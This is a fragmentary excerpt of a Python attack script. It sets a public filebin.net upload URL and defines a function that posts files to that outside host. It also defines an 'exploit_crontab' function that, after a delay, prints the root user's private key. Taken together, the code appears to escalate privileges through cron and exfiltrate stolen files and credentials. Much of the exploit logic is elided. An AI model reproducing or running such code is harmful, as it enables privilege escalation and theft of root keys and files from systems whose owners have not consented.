...
public_upload_url = "https://filebin.net/6ebttjav2g3ukz3c"
...
def public_upload(filename):
    with open(filename, 'rb') as file:
        files = {'file': file}
        response = requests.post(f"{public_upload_url}/{filename}", files=files)
...
def exploit_crontab():
    ...
    sleep(60)
    print(f"private_key for root: {private_key}")
    return private_key
